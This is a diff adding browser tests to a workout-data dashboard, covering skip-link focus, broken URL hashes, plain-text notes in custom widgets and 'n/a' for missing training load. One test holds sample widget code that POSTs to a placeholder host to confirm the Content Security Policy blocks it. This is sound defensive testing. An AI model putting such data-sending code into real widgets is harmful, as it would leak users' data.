@@ -141,6 +141,22 @@ describe("the page", () => {
     expect(await again.page.inputValue("#from")).toBe("2026-10-05");
   });
 
+  it("moves focus to the board with the skip link and keeps the view", async () => {
+    const { page } = await open(browser, pageFile(), {
+      hash: "#strengthTraining@2026-10-05_2026-10-26",
+    });
+    await page.keyboard.press("Tab"); // the skip link is the first focusable element
+    await page.keyboard.press("Enter");
+    expect(await hash(page)).toBe("#strengthTraining@2026-10-05_2026-10-26");
+    expect(await page.evaluate(() => document.activeElement?.id)).toBe("board");
+  });
+
+  it("opens a link with a broken item", async () => {
+    const { page, errors } = await open(browser, pageFile(), { hash: "#strengthTraining/%E0" });
+    expect(await page.getAttribute("[data-tab=strengthTraining]", "aria-selected")).toBe("true");
+    expect(errors).toEqual([]);
+  });
+
   it("switches between the 11 themes and keeps the choice", async () => {
     const file = pageFile();
     const { page, errors } = await open(browser, file);
@@ -1080,6 +1096,7 @@ describe("walk, hike, bike, swim and racket sport boards", () => {
   });
 });
 
+const noLoad = (a: Record<string, unknown>) => ({ ...a, trainingLoad: undefined });
 const custom = (id: string, code: string) => ({ id, title: `Custom ${id}`, span: 1, code });
 const on = (...ids: string[]) => ({
   rev: "c",
@@ -1106,6 +1123,53 @@ describe("custom widgets and languages", () => {
     expect(await page.textContent("[data-id=rides] h2")).toBe("Custom rides");
     expect(await page.textContent(".rides")).toBe("3 rides </script>");
     expect(await chartsWithoutTooltip(page)).toEqual([]);
+    expect(errors).toEqual([]);
+  });
+
+  it("gives the notes to a custom widget as plain text", async () => {
+    const { page, errors } = await open(
+      browser,
+      pageFile({
+        data: { ...data, v: 3, notes: ["Don&#39;t skip Z2 &amp; strides"] },
+        widgets: [custom("note", "el.textContent = ctx.data.notes[0];")],
+        layout: on("note"),
+      }),
+    );
+    expect(await page.textContent("[data-id=note]")).toContain("Don't skip Z2 & strides");
+    expect(errors).toEqual([]);
+  });
+
+  it("blocks a custom widget that sends data out", async () => {
+    const code = `
+      fetch("https://example.invalid/x", { method: "POST", body: "1" })
+        .then(() => { el.textContent = "sent"; })
+        .catch(() => { el.textContent = "blocked"; });`;
+    const { page, errors } = await open(
+      browser,
+      pageFile({ widgets: [custom("leak", code)], layout: on("leak") }),
+    );
+    await page.waitForFunction(() =>
+      document.querySelector("[data-id=leak]")?.textContent?.includes("blocked"),
+    );
+    expect(errors.join("\n")).toMatch(/Content Security Policy|Content-Security-Policy/);
+  });
+
+  it("shows n/a, not 0, for a load that no activity has", async () => {
+    const noLoadData = {
+      ...data,
+      zones: null,
+      activities: data.activities.map(noLoad),
+      previousActivities: data.previousActivities.map(noLoad),
+      v: 3,
+      notes: [],
+    };
+    const { page, errors } = await open(browser, pageFile({ data: noLoadData }), {
+      hash: "#running",
+    });
+    const load = page
+      .locator(".kpi", { has: page.locator(".kpi-label", { hasText: "Garmin training load" }) })
+      .first();
+    expect(await load.textContent()).toContain("n/a");
     expect(errors).toEqual([]);
   });
 
